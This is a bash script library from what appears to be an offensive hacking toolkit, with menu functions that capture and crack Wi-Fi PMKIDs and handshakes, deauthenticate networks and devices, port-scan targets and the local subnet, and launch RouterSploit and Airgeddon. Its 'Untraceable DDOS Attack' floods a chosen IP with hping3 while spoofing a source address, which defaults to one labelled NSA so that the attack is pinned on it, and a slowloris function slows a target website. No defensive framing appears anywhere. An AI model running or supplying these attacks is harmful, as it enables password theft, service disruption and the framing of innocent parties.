source "lib/capture-pmkid.sh"
source "lib/capture-handshake.sh"
source "lib/crack-pmkid.sh"
source "lib/crack-handshake.sh"
source "lib/capture-packets.sh"
source "lib/deauth-network.sh"
source "lib/deauth-device.sh"
source "lib/router-sploit.sh"
source "lib/airgeddon.sh"

capture-pmkid() {
    network-scan-1
    echo ""
    read -p "File name to save as: " FILE1
    echo ""
    echo "During Capture press "CTRL + C" to stop"
    read -n 1 -r -s -p "Press any button to begin capture..."
    clear
    hcxdumptool -i "$INTERFACE" -o "$FILE1".pcapng --enable_status=1 -c "$CHANNEL1"
    hcxpcaptool -E essidlist -I identitylist -U usernamelist -z "$FILE1".16800 "$FILE1".pcapng
    mv "$FILE1".pcapng PMKID
    mv "$FILE1".16800 PMKID
    rm -R identitylist
    rm -R essidlist
    sleep 1
    clear
    echo "PMKID File Saved"
    echo "File Converted"
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed
    ifconfig "$INTERFACE" up
    sleep 2
    main-choice-1
}
capture-handshake() {
    network-scan-2
    echo ""
    read -p "File name to save as: " FILE2
    echo ""
    echo "During Capture press "CTRL + C" to stop"
    read -n 1 -r -s -p "Press any button to begin capture..."
    airodump-ng -c$CHANNEL2 -w "$FILE2" -d "$BSSID2" "$INTERFACE"
    clear
    rm "$FILE2"-01.csv
    rm "$FILE2"-01.kismet.csv
    rm "$FILE2"-01.kismet.netxml
    rm "$FILE2"-01.log.csv
    mv "$FILE2"-01.cap Handshake/
    echo "Handshake File Saved"
    echo "Files cleaned"
    echo "File moved"
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed
    ifconfig "$INTERFACE" up
    sleep 1
    main-menu
}

crack-pmkid() {
    show-pmkids
    choose-list-2
    clear
    cd $PERM_DIR
    hashcat -m 16800 PMKID/$CHOSEN_PMKID -a 0 --kernel-accel=1 -w 3 --force Password-List/$SELECTED_LIST
    read -n 1 -r -s
    main-menu
}
crack-handshake() {
    choose-file-1
    choose-list-1
    clear
    aircrack-ng Handshake/$CHOSEN_FILE -w Password-List/$SELECTED_LIST
    read -n 1 -r -s
    main-choice-1
}
capture-packets() {
    network-scan-3
    echo ""
    read -p "File to save as: " FILE3
    clear
    airodump-ng --bssid $BSSID3 -c $CHANNEL3 -w $FILE3 $INTERFACE
    mv "$FILE3"-01.cap Captured-packets
    rm "$FILE3"-01.csv
    rm "$FILE3"-01.kismet.csv
    rm "$FILE3"-01.kismet.netxml
    rm "$FILE3"-01.log.csv
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed
    ifconfig "$INTERFACE" up
    wireshark-check
}
geolocate() {
    geoip() {
        clear
        figlet Gerolocate IP
        echo "------------------- Geolocate and IP Adress -------------------"
        echo ""
        echo -e "\e[1;31mWARNING:\e[0m If using a URL use "nslookup" to get IP"
        echo ""
        read -p "Enter Target IP: " IP
        if [ -z $IP ]
        then
        echo ""
        echo "Cannot leave blank"
        sleep 2
        geoip
        else 
        echo ""
        curl https://api.hackertarget.com/geoip/?q="$IP"
        echo ""
        echo ""
        read -n 1 -r -s -p "Press any key to continue..."
        fi
    }
    geoip
    main-menu
}
port-scan() {
    nmap-error-check() {
        OPENPORT=$(cat temp.txt | grep "open")
        if [ -z $OPENPORT ]
        then
        echo "No Open Ports Found!"
        fi
    }
    scan-function() {
        clear
        figlet Port Scan
        echo "------- Scan for Open Ports on a Network -------"
        echo ""
        echo -e "\e[1;31mWARNING:\e[0m Remove "http" if using a URL"
        echo ""
        read -p "Enter Target IP: " IP
        if [ -z $IP ]
        then
        echo ""
        echo "Cannot leave blank"
        sleep 2
        scan-function
        else
        nmap "$IP" > temp.txt
        echo ""
        OPENPORT=$(cat temp.txt | grep "open")
        if [ -z $OPENPORT ]
        then
        echo "No Open Ports Found!"
        else
        cat temp.txt | grep "PORT"
        cat temp.txt | grep "open"
        fi
        echo ""
        rm temp.txt
        read -n 1 -r -s -p "Press any key to continue..."
        fi
    }
    scan-function
    main-menu
}
local-scan() {
    loading-screen-1() {
    clear
    figlet Local Scan
    echo "-------- Scan all devices on a local network --------"
    echo ""
    echo -e "\e[1;31mWARNING:\e[0m The network you are connected to will be scanned"
    echo ""
    echo "Scanning..."
    }
    local-scan-results() {
        clear
    figlet Local Scan
    echo "-------- Scan for all devices on a local network --------"
    echo ""
    echo -e "\e[1;31mWARNING:\e[0m The network you are connected to will be scanned"
    echo ""
    cat temp2.txt
    rm temp2.txt
    echo ""
    read -n 1 -r -s -p "Press any key to continue..."
    }

    loading-screen-1
    nmap -p 1-100 192.168.0.1/24 > temp.txt
    cat temp.txt | grep -v "Not shown" > temp2.txt
    cat temp2.txt | grep -v "Starting" > temp.txt
    sed -i '$ d' temp.txt
    cat temp.txt | grep -v "Host is up" > temp2.txt
    sed -i 's/All 100 scanned ports on.*are/All ports/g' temp2.txt
    sed -i 's/Nmap scan report/Scan report/g' temp2.txt
    rm temp.txt
    local-scan-results
    main-menu
}
ddos-ip() {
    clear 
    figlet DDOS IP Address
    echo ""
    echo "================== Untraceable DDOS Attack =================="
    echo ""
    read -p "Enter Target IP Address: " IP
    if [ -z $IP ]
    then
    echo ""
    echo "Cannot leave blank"
    sleep 2
    ddos-ip
    fi
    read -p "IP Address to Frame (default is NSA): " FALL
    if [ -z $FALL ]
    then
    FALL="104.98.41.58"
    fi
    read -p "Enter Port (default is all ports): " PORT
    if [ -z $PORT ]
    then
    echo ""
    echo "Press CTRL + C to stop DDOS"
    echo ""
    echo "Sending Packets..."
    hping3 -1 --flood -a "$FALL" "$IP" > /dev/null 2>&1
    else
    echo ""
    echo "Press CTRL + C to stop DDOS"
    echo ""
    echo "Sending Packets..."
    hping3 -S -a $FALL --flood -p $PORT $IP > /dev/null 2>&1
    fi
    echo ""
    read -n 1 -r -s -p "Press any key to continue..."
    main-menu
}
slowloris-attack() {
    clear
    figlet Slow Loris Attack
    echo "------------------- Slow down a website with http requests -------------------"
    echo ""
    read -p "Enter target URL: " URL
    echo ""
    if [ -z $URL ]
    then
    echo "Cannot leave blank"
    sleep 2
    slowloris-attack
    else
    slowhttptest -c 500 -H -i 10 -r 200 -t GET -u $URL -x 24 -p 2
    fi
    clear
    main-menu
    
}
deauth-network() {
    network-scan-4
    clear
    aireplay-ng -0 0 -a $BSSID4 $INTERFACE
    main-menu

}
deauth-device() {
    network-scan-5
    device-scan
    choose-device
    clear
    aireplay-ng --deauth 0 -a $BSSID5 -c $CHOSEN_DEVICE $INTERFACE
    main-menu
}
router-sploit() {
    routersploit-check
    cd "$PERM_DIR"/Programs/routersploit
    clear
    python3 rsf.py
    cd "$PERM_DIR"
    main-menu
}
airgeddon-void() {
    airgeddon-check
    cd "$PERM_DIR"/Programs/airgeddon
    ./airgeddon.sh
    main-menu
}
